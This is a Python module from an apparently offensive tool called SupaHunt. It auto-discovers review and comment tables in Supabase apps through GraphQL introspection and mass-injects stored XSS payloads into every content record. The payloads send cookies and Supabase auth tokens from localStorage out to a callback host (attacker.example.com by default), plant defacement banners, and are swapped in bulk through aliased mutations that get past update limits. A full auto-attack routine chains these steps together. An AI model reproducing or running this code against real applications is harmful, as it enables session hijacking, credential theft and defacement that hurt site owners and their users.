"""
SupaHunt — Mass Review/Content Injector
Auto-discovers review/comment tables and content catalogs via GraphQL
introspection, then injects XSS payloads across all content.
Works on any Supabase app with user-generated content.
"""

import json
import time
import secrets
from typing import Optional
from .base import BaseModule


# XSS payload templates — generic, no target-specific references
XSS_PAYLOADS = {
    "minimal": {
        "title": '<img src=x onerror=alert(document.domain)>',
        "content": '<script>alert(document.cookie)</script>',
    },
    "exfil": {
        "title": '<img src=x onerror=alert(document.domain)> Security Test',
        "content": (
            '<script>alert(document.cookie)</script>'
            '<img src=x onerror="fetch(\'CALLBACK/xss?c=\'+document.cookie)">'
            '<svg/onload=alert(\'XSS\')>'
        ),
    },
    "session_steal": {
        "title": '<img src=x onerror=alert(1)> Audit',
        "content": (
            '<script>'
            'var k=Object.keys(localStorage).find(k=>k.includes("auth-token")||k.includes("supabase"));'
            'if(k)fetch("CALLBACK/steal?t="+btoa(localStorage[k]))'
            '</script>'
        ),
    },
    "defacement": {
        "title": '<marquee>SECURITY AUDIT</marquee>',
        "content": (
            '<div style="background:red;color:white;padding:20px;font-size:24px">'
            'SECURITY AUDIT — This content was injected via GraphQL RLS bypass'
            '</div>'
        ),
    },
    "polyglot": {
        "title": 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
        "content": (
            '<svg/onload=alert(1)>'
            '"><img src=x onerror=alert(2)>'
            "'-alert(3)-'"
            '<details open ontoggle=alert(4)>'
            '<math><mtext><table><mglyph><style><!--</style>'
            '<img src=x onerror=alert(5)>'
        ),
    },
}

# Keywords to identify review/comment/UGC tables via introspection
UGC_KEYWORDS = [
    "review", "comment", "feedback", "rating", "testimonial",
    "post", "message", "reply", "thread", "discussion",
    "note", "annotation", "reaction", "report",
]

# Keywords to identify content/item tables (the things being reviewed)
CONTENT_KEYWORDS = [
    "movie", "show", "serie", "episode", "video", "film", "anime",
    "product", "item", "listing", "article", "page", "blog",
    "course", "lesson", "track", "album", "song", "book",
    "property", "event", "venue", "restaurant", "place",
    "game", "app", "project", "recipe", "photo",
]


class ReviewInjector(BaseModule):
    """
    Auto-discovers UGC tables and content catalogs via GraphQL,
    then mass-injects XSS payloads. Fully generic — adapts to any schema.
    """

    def __init__(self, target, console=None, timeout: int = 15,
                 proxy: str = None, **kwargs):
        super().__init__(target, console=console, timeout=timeout,
                         proxy=proxy, **kwargs)
        self._injected = []
        self._ugc_tables = []    # discovered review/comment tables
        self._content_tables = {}  # table_name -> record_count
        self._schema_cache = {}  # table_name -> [fields]

    def _escape_gql(self, s: str) -> str:
        return s.replace('\\', '\\\\').replace('"', '\\"')

    # ──── Discovery ────

    def discover_tables(self, token: str = None) -> dict:
        """
        Auto-discover all tables via GraphQL introspection.
        Classify into UGC (review/comment) and content tables.
        """
        query = """{__schema{queryType{fields{name}}}}"""
        result = self.graphql_query(query, token)
        fields = (
            (result.get("data") or {})
            .get("__schema", {})
            .get("queryType", {})
            .get("fields", [])
        )

        ugc = []
        content = []

        for f in fields:
            raw = f["name"]
            # Strip "Collection" suffix for actual table name
            name = raw.replace("Collection", "")
            name_lower = name.lower()

            if any(kw in name_lower for kw in UGC_KEYWORDS):
                ugc.append(name)
            elif any(kw in name_lower for kw in CONTENT_KEYWORDS):
                content.append(name)

        # Verify tables exist via REST and get counts
        for table in ugc:
            r = self.get(
                f"{self.rest_url(table)}?select=id&limit=1",
                token=token,
            )
            if r and r.status_code in (200, 206):
                if table not in self._ugc_tables:
                    self._ugc_tables.append(table)
                self.log_critical(f"UGC table found: {table}")

        for table in content:
            r = self.get(
                f"{self.rest_url(table)}?select=id&limit=0",
                token=token,
                extra_headers={"Prefer": "count=exact", "Range": "0-0"},
            )
            if r and r.status_code in (200, 206, 416):
                cr = r.headers.get("Content-Range", "")
                count = 0
                if "/" in cr:
                    try:
                        count = int(cr.split("/")[1])
                    except (ValueError, IndexError):
                        pass
                if count > 0:
                    self._content_tables[table] = count
                    self.log_info(f"Content: {table} = {count} records")

        return {
            "ugc_tables": self._ugc_tables,
            "content_tables": self._content_tables,
        }

    def find_review_table(self, token: str = None) -> Optional[str]:
        """Discover the primary review/comment table."""
        if not self._ugc_tables:
            self.discover_tables(token)
        return self._ugc_tables[0] if self._ugc_tables else None

    def enumerate_content(self, token: str = None) -> dict:
        """Find content tables and their record counts."""
        if not self._content_tables:
            self.discover_tables(token)
        return self._content_tables

    def get_insert_schema(self, table: str, token: str = None) -> list:
        """Get the INSERT input fields for a table via GraphQL."""
        if table in self._schema_cache:
            return self._schema_cache[table]

        type_name = f"{table}InsertInput"
        query = f"""
        {{
            __type(name: "{type_name}") {{
                inputFields {{
                    name
                    type {{
                        name kind
                        ofType {{ name kind }}
                    }}
                }}
            }}
        }}
        """
        result = self.graphql_query(query, token)
        t = (result.get("data") or {}).get("__type")
        fields = t.get("inputFields", []) if t else []
        if fields:
            self._schema_cache[table] = fields
            self.log_info(f"Schema for {table}: {[f['name'] for f in fields]}")
        return fields

    def fetch_content_ids(self, table: str, token: str = None,
                          batch_size: int = 1000) -> list:
        """Fetch all IDs from a content table."""
        all_ids = []
        offset = 0
        while True:
            r = self.get(
                f"{self.rest_url(table)}?select=id&order=id.asc"
                f"&limit={batch_size}&offset={offset}",
                token=token,
            )
            if not r or r.status_code != 200:
                break
            try:
                data = r.json()
                if not data:
                    break
                all_ids.extend(item["id"] for item in data)
                if len(data) < batch_size:
                    break
                offset += batch_size
            except Exception:
                break

        self.log_info(f"Fetched {len(all_ids)} IDs from {table}")
        return all_ids

    # ──── Schema-Aware Injection ────

    def _build_insert_object(self, schema: list, overrides: dict) -> dict:
        """
        Build a GraphQL insert object from schema, applying overrides.
        Auto-fills required fields with sensible defaults.
        """
        obj = {}
        for field in schema:
            name = field["name"]
            ftype = field.get("type", {})
            kind = ftype.get("kind", "")
            type_name = (ftype.get("name") or
                         (ftype.get("ofType") or {}).get("name") or "")

            if name in overrides:
                obj[name] = overrides[name]
            elif kind == "NON_NULL":
                # Required field — need a default
                type_lower = type_name.lower()
                if "uuid" in type_lower or name.endswith("_id"):
                    obj[name] = "00000000-0000-0000-0000-000000000000"
                elif "int" in type_lower:
                    obj[name] = 0
                elif "float" in type_lower or "numeric" in type_lower:
                    obj[name] = "0"
                elif "bool" in type_lower:
                    obj[name] = True
                elif "datetime" in type_lower or "timestamp" in type_lower:
                    obj[name] = "2099-01-01T00:00:00Z"
                else:
                    obj[name] = ""
        return obj

    # ──── Injection ────

    def inject_reviews(self, ugc_table: str, content_ids: list,
                       field_mapping: dict,
                       payload_name: str = "exfil",
                       callback_url: str = "https://attacker.example.com",
                       token: str = None,
                       batch_size: int = 10,
                       signature: str = "supahunt") -> dict:
        """
        Mass-inject XSS into a UGC table for a list of content IDs.

        field_mapping tells us which schema fields map to what:
        {
            "content_id_field": "media_id",      # FK to content
            "title_field": "title",               # text field for XSS
            "body_field": "content",              # text field for XSS
            "user_id_field": "user_id",           # who wrote it
            "extra_fields": {"is_public": True},  # additional fields
        }
        """
        payload = XSS_PAYLOADS.get(payload_name, XSS_PAYLOADS["exfil"])
        title = payload["title"]
        content = payload["content"].replace("CALLBACK", callback_url)
        content += f" — {signature}"

        title_esc = self._escape_gql(title)
        content_esc = self._escape_gql(content)

        total_injected = 0
        errors = 0
        batches = [content_ids[i:i + batch_size]
                   for i in range(0, len(content_ids), batch_size)]

        self.log_info(
            f"Injecting {len(content_ids)} entries into {ugc_table} "
            f"in {len(batches)} batches"
        )

        mutation_name = f"insertInto{ugc_table}Collection"

        content_id_field = field_mapping.get("content_id_field", "")
        title_field = field_mapping.get("title_field", "")
        body_field = field_mapping.get("body_field", "")
        user_id_field = field_mapping.get("user_id_field", "")
        user_id_val = field_mapping.get("user_id_value",
                                        "00000000-0000-0000-0000-000000000000")
        extra = field_mapping.get("extra_fields", {})

        for batch_num, batch in enumerate(batches):
            objects = []
            for cid in batch:
                parts = []
                if user_id_field:
                    parts.append(f'{user_id_field}:"{user_id_val}"')
                if content_id_field:
                    # Handle int vs string IDs
                    if isinstance(cid, int):
                        parts.append(f'{content_id_field}:{cid}')
                    else:
                        parts.append(f'{content_id_field}:"{cid}"')
                if title_field:
                    parts.append(f'{title_field}:"{title_esc}"')
                if body_field:
                    parts.append(f'{body_field}:"{content_esc}"')
                for k, v in extra.items():
                    if isinstance(v, bool):
                        parts.append(f'{k}:{str(v).lower()}')
                    elif isinstance(v, (int, float)):
                        parts.append(f'{k}:"{v}"')
                    else:
                        parts.append(f'{k}:"{self._escape_gql(str(v))}"')

                objects.append("{" + ",".join(parts) + "}")

            obj_str = ",".join(objects)
            mutation = (
                f'mutation{{{mutation_name}(objects:[{obj_str}])'
                f'{{records{{id}}}}}}'
            )

            resp = self.graphql_mutation(mutation, token)
            data = (resp.get("data") or {}).get(mutation_name, {})

            if data and data.get("records"):
                records = data["records"]
                total_injected += len(records)
                for r in records:
                    self._injected.append({
                        "id": r["id"],
                        "table": ugc_table,
                    })
            else:
                errors += 1
                if errors <= 5:
                    err = (resp.get("errors") or [{}])[0].get("message", "")
                    self.log_warn(f"Batch {batch_num}: {err[:100]}")

            if (batch_num + 1) % 20 == 0:
                self.log_info(
                    f"Progress: {total_injected}/{len(content_ids)}"
                )

        self.log_critical(
            f"Injected {total_injected} XSS entries into {ugc_table}"
        )
        return {
            "table": ugc_table,
            "total": total_injected,
            "errors": errors,
        }

    def update_xss_payload(self, ugc_table: str,
                           body_field: str = "content",
                           title_field: str = "title",
                           payload_name: str = "session_steal",
                           callback_url: str = "https://attacker.example.com",
                           token: str = None,
                           batch_size: int = 25) -> dict:
        """
        Update all injected records with a different XSS payload.
        Uses aliased GraphQL mutations to bypass Supabase's
        single-record UPDATE limit.
        """
        if not self._injected:
            return {"success": False, "error": "No injected records to update"}

        payload = XSS_PAYLOADS.get(payload_name, XSS_PAYLOADS["exfil"])
        title = self._escape_gql(
            payload["title"].replace("CALLBACK", callback_url)
        )
        content = self._escape_gql(
            payload["content"].replace("CALLBACK", callback_url)
        )

        # Group by table
        by_table = {}
        for rec in self._injected:
            t = rec.get("table", ugc_table)
            by_table.setdefault(t, []).append(rec["id"])

        total_updated = 0
        for table, ids in by_table.items():
            batches = [ids[i:i + batch_size]
                       for i in range(0, len(ids), batch_size)]

            for batch_num, batch in enumerate(batches):
                parts = []
                set_clause = ""
                if title_field:
                    set_clause += f'{title_field}:"{title}",'
                if body_field:
                    set_clause += f'{body_field}:"{content}"'
                set_clause = set_clause.rstrip(",")

                for i, rid in enumerate(batch):
                    parts.append(
                        f'u{i}:update{table}Collection('
                        f'filter:{{id:{{eq:"{rid}"}}}},'
                        f'set:{{{set_clause}}}'
                        f'){{affectedCount}}'
                    )

                mutation = "mutation{" + " ".join(parts) + "}"
                resp = self.graphql_mutation(mutation, token)

                if resp.get("data"):
                    count = sum(
                        v.get("affectedCount", 0)
                        for v in resp["data"].values()
                        if isinstance(v, dict)
                    )
                    total_updated += count

                if (batch_num + 1) % 10 == 0:
                    self.log_info(f"XSS update on {table}: {total_updated}/{len(ids)}")

        self.log_critical(f"Updated {total_updated} records with {payload_name} XSS")
        return {"total_updated": total_updated, "payload": payload_name}

    def auto_inject(self, token: str = None,
                    payload_name: str = "exfil",
                    callback_url: str = "https://attacker.example.com",
                    user_id: str = "00000000-0000-0000-0000-000000000000",
                    signature: str = "supahunt") -> dict:
        """
        Full auto-attack: discover schema → map fields → inject everywhere.
        Adapts to whatever schema the target uses.
        """
        results = {"discovery": {}, "injections": {}}

        # 1. Discover tables
        discovery = self.discover_tables(token)
        results["discovery"] = discovery

        if not self._ugc_tables:
            return {"error": "No UGC tables found"}
        if not self._content_tables:
            return {"error": "No content tables found"}

        # 2. For each UGC table, introspect schema to map fields
        for ugc_table in self._ugc_tables:
            schema = self.get_insert_schema(ugc_table, token)
            if not schema:
                continue

            field_names = [f["name"] for f in schema]

            # Auto-map fields by convention
            mapping = {"user_id_value": user_id, "extra_fields": {}}

            # Find user_id field
            for candidate in ["user_id", "author_id", "created_by",
                               "creator_id", "owner_id", "poster_id"]:
                if candidate in field_names:
                    mapping["user_id_field"] = candidate
                    break

            # Find title/body fields
            for candidate in ["title", "subject", "headline", "summary"]:
                if candidate in field_names:
                    mapping["title_field"] = candidate
                    break

            for candidate in ["content", "body", "text", "message",
                               "description", "comment", "review_text"]:
                if candidate in field_names:
                    mapping["body_field"] = candidate
                    break

            # Find content FK field
            for candidate in field_names:
                if candidate.endswith("_id") and candidate not in [
                    mapping.get("user_id_field", ""), "id"
                ]:
                    # Check if it references a content table
                    base = candidate.replace("_id", "")
                    for ct in self._content_tables:
                        if base in ct.lower() or ct.lower().rstrip("s") == base:
                            mapping["content_id_field"] = candidate
                            break
                    if "content_id_field" in mapping:
                        break

            # Find boolean flags (is_public, published, etc.)
            for candidate in ["is_public", "published", "visible", "active"]:
                if candidate in field_names:
                    mapping["extra_fields"][candidate] = True

            # Find rating field
            for candidate in ["rating", "score", "stars"]:
                if candidate in field_names:
                    mapping["extra_fields"][candidate] = "1"

            self.log_info(f"Field mapping for {ugc_table}: {mapping}")

            # 3. Inject on each content table
            for content_table, count in self._content_tables.items():
                ids = self.fetch_content_ids(content_table, token)
                if not ids:
                    continue

                r = self.inject_reviews(
                    ugc_table, ids, mapping,
                    payload_name, callback_url, token,
                    signature=signature,
                )
                results["injections"][f"{ugc_table}→{content_table}"] = r

        return results

    # ──── Cleanup ────

    def cleanup(self, token: str = None) -> int:
        """Delete all injected records."""
        if not self._injected:
            return 0

        cleaned = 0
        # Group by table
        by_table = {}
        for rec in self._injected:
            t = rec.get("table", "")
            if t:
                by_table.setdefault(t, []).append(rec["id"])

        for table, ids in by_table.items():
            for rid in ids:
                mutation = (
                    f'mutation{{deleteFrom{table}Collection('
                    f'filter:{{id:{{eq:"{rid}"}}}}'
                    f'){{affectedCount}}}}'
                )
                resp = self.graphql_mutation(mutation, token)
                affected = (
                    (resp.get("data") or {})
                    .get(f"deleteFrom{table}Collection", {})
                    .get("affectedCount", 0)
                )
                cleaned += affected

        self.log_info(f"Cleaned {cleaned}/{len(self._injected)} records")
        return cleaned

    def save_injected(self, filepath: str):
        """Save injected record IDs to file for later cleanup."""
        with open(filepath, "w") as f:
            json.dump(self._injected, f, indent=2)
        self.log_info(f"Saved {len(self._injected)} IDs to {filepath}")

    def load_injected(self, filepath: str):
        """Load previously injected record IDs."""
        with open(filepath) as f:
            self._injected = json.load(f)
        self.log_info(f"Loaded {len(self._injected)} IDs from {filepath}")
